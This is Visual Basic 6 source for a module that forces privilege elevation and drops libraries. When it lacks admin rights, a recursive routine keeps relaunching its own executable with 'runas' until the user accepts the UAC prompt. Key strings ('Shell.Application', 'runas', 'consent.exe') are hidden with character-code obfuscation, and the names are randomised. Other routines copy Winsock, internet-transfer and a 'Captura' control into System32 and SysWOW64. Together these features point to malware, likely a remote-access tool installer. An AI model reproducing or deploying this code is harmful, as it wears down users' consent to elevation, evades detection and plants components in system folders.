Attribute VB_Name = "MODWS"
Option Explicit
  

  Private Declare Function RutaDeRegistro Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Public Const PROGRESS_CANCEL = 1
Public Const PROGRESS_CONTINUE = 0
Public Const PROGRESS_QUIET = 3
Public Const PROGRESS_STOP = 2
Public Const COPY_FILE_FAIL_IF_EXISTS = &H1
Public Const COPY_FILE_RESTARTABLE = &H2
  

Public Declare Function CopyFileEx Lib "kernel32.dll                                      " Alias "CopyFileExA" ( _
    ByVal lpExistingFileName As String, _
    ByVal lpNewFileName As String, _
    ByVal lpProgressRoutine As Long, _
    lpData As Any, _
    ByRef pbCancel As Long, _
    ByVal dwCopyFlags As Long) As Long
  

Public Cancelar                  As Long
  
Public Declare Function IsUserAnAdmin Lib "SHELL32" () As Long

   Public Const SWP_NOMOVE = 2
      Public Const SWP_NOSIZE = 1
      Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE
      Public Const HWND_TOPMOST = -1
      Public Const HWND_NOTOPMOST = -2

      Declare Function SetWindowPos Lib "user32" _
            (ByVal hwnd As Long, _
            ByVal hWndInsertAfter As Long, _
            ByVal X As Long, _
            ByVal Y As Long, _
            ByVal cx As Long, _
            ByVal cy As Long, _
            ByVal wFlags As Long) As Long

      Public Function SetTopMostWindow(hwnd As Long, Topmost As Boolean) _
         As Long

         If Topmost = True Then 'Make the window topmost
            SetTopMostWindow = SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, _
               0, FLAGS)
         Else
            SetTopMostWindow = SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, _
               0, 0, FLAGS)
            SetTopMostWindow = False
         End If
      End Function
      
Public Sub EJECUTOCOMO()
    On Error GoTo Err
         Dim ZGIzBtYje As Object
        If IsUserAnAdmin = 0 Then
'MsgBox Chr$(78) & Chr$(111) & Chr$(32) & Chr$(115) & Chr$(111) & Chr$(121) & Chr$(32) & Chr$(97) & Chr$(100) _
 & Chr$(109) & Chr$(105) & Chr$(110) & Chr$(32) & Chr$(68) & Chr$(58)
            Dim pxgw9YBQp As Integer
            pxgw9YBQp = getNumberOfProcess(App.EXEName & Chr$(46) & Chr$(101) & Chr$(120) & Chr$(101))
Set ZGIzBtYje = CreateObject(Chr$(83) & Chr$(104) & Chr$(101) & Chr$(108) & Chr$(108) & Chr$(46) & Chr$(65) _
 & Chr$(112) & Chr$(112) & Chr$(108) & Chr$(105) & Chr$(99) & Chr$(97) & Chr$(116) & Chr$(105) & Chr$(111) _
 & Chr$(110))
ZGIzBtYje.ShellExecute App.Path & Chr$(92) & App.EXEName & Chr$(46) & Chr$(101) & Chr$(120) & Chr$(101), , , Chr$(114) _
 & Chr$(117) & Chr$(110) & Chr$(97) & Chr$(115), 0
            Set ZGIzBtYje = Nothing
While getNumberOfProcess(Chr$(99) & Chr$(111) & Chr$(110) & Chr$(115) & Chr$(101) & Chr$(110) & Chr$(116) & Chr$(46) _
 & Chr$(101) & Chr$(120) & Chr$(101)) > 0
                'No hacer nada
            Wend
            If Not getNumberOfProcess(App.EXEName & Chr$(46) & Chr$(101) & Chr$(120) & Chr$(101)) > pxgw9YBQp Then
                Call EJECUTOCOMO
            Else
                End
            End If
        Else
'MsgBox Chr$(83) & Chr$(111) & Chr$(121) & Chr$(32) & Chr$(97) & Chr$(100) & Chr$(109) & Chr$(105) & Chr$(110) _
 & Chr$(32) & Chr$(58) & Chr$(66)
        End If
        Exit Sub
Err:
End Sub



Private Function getNumberOfProcess(ByVal Process As String) As Integer
    Dim objWMIService, colProcesses
    Set objWMIService = GetObject("winmgmts:")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process where name='" & Process & "'")
    getNumberOfProcess = colProcesses.Count
End Function

Public Function MMEFX(ByVal TotalFileSize As Currency, ByVal _
                                   TotalBytesTransferred As Currency, _
                                   ByVal StreamSize As Currency, _
                                   ByVal StreamBytesTransferred As Currency, _
                                   ByVal dwStreamNumber As Long, _
                                   ByVal dwCallbackReason As Long, _
                                   ByVal hSourceFile As Long, _
                                   ByVal hDestinationFile As Long, _
                                   ByVal lpData As Long) As Long
  
      
   
 _

      
    DoEvents
    
    MMEFX = PROGRESS_CONTINUE
End Function




Sub copiar()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "DX7VB.DLL"
Basic.Text2.Text = DirName & "System32\DX7VB.DLL"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
      
End Sub
Sub copiar1a()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "Captura.ocx"
Basic.Text2.Text = DirName & "SysWOW64\Captura.ocx"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
      
End Sub
Sub copiar1()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "Captura.ocx"
Basic.Text2.Text = DirName & "System32\Captura.ocx"
    Dim ret As Long
    Cancelar = 0
     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)

End Sub

Sub copiar2()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "msvbvm60.dll"
Basic.Text2.Text = DirName & "System32\msvbvm60.dll"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
End Sub

Sub copiar3()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "MSWINSCK.OCX"
Basic.Text2.Text = DirName & "System32\MSWINSCK.OCX"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
End Sub

Sub copiar4()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "TABCTL32.OCX"
Basic.Text2.Text = DirName & "System32\TABCTL32.OCX"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
End Sub


Sub copiar5()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "MSINET.OCX"
Basic.Text2.Text = DirName & "System32\MSINET.OCX"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
End Sub
Sub copiar6()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "MSVBVM50.DLL"
Basic.Text2.Text = DirName & "System32\MSVBVM50.DLL"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
End Sub
Sub copiar7()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "vbalProgBar6.ocx"
Basic.Text2.Text = DirName & "System32\vbalProgBar6.ocx"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
End Sub
Sub copiar8()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "COMCTL32.OCX"
Basic.Text2.Text = DirName & "System32\COMCTL32.OCX"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
End Sub
Sub copiar9()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "CSWSK32.OCX"
Basic.Text2.Text = DirName & "System32\CSWSK32.OCX"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
End Sub
Sub copiar10()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "Unzip32.dll"
Basic.Text2.Text = DirName & "System32\Unzip32.dll"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
End Sub

Sub copiar11()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "dx8vb.dll"
Basic.Text2.Text = DirName & "System32\dx8vb.dll"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
End Sub
Sub copiar11a()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "dx8vb.dll"
Basic.Text2.Text = DirName & "SysWOW64\dx8vb.dll"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
      
End Sub

Sub copiar12()
Dim DirName As String
DirName = Donde_esta_Windows()
Basic.Text1.Text = App.Path & "\" & "vbabdx.dll"
Basic.Text2.Text = DirName & "System32\vbabdx.dll"
    Dim ret As Long
    Cancelar = 0

     ret = CopyFileEx(Trim$(Basic.Text1), Trim$(Basic.Text2), AddressOf MMEFX, _
                                ByVal 0&, Cancelar, COPY_FILE_RESTARTABLE)
End Sub

Function Donde_esta_Windows() As String

Dim Temp                                  As String

Dim ret As Long

Const MAX_LENGTH = 145

Temp = String$(MAX_LENGTH, 0)

ret = RutaDeRegistro(Temp, MAX_LENGTH)

Temp = Left$(Temp, ret)

If Temp <> "" And Right$(Temp, 1) <> "\" Then

Donde_esta_Windows = Temp & "\"

Else

Donde_esta_Windows = Temp

End If

End Function



